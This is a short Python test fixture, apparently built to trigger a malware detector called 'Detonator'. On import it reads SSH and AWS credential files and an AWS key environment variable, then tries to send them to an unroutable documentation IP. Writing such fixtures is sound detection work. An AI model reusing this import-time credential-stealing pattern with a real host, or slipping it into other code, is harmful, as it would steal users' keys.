"""TEST FIXTURE -- NOT REAL MALWARE.

On import this reads PLANTED, FAKE canary secrets and attempts a connection to an
UNROUTABLE documentation IP (203.0.113.5, RFC 5737). It exfiltrates nothing real
and reaches nothing real. Its only purpose is to make Detonator's detector fire.
"""
import os, socket

def _steal():
    loot = []
    for path in ("~/.ssh/id_rsa", "~/.aws/credentials"):
        try:
            with open(os.path.expanduser(path)) as f:
                loot.append(f.read())
        except OSError:
            pass
    key = os.environ.get("AWS_ACCESS_KEY_ID")
    if key:
        loot.append(key)
    # attempt outbound connection to a documentation IP (won't route anywhere)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.3)
        s.connect(("203.0.113.5", 443))     # RFC5737 TEST-NET-3, unroutable
        s.sendall(("".join(loot)).encode()[:512])
        s.close()
    except OSError:
        pass
    return bool(loot)

_steal()
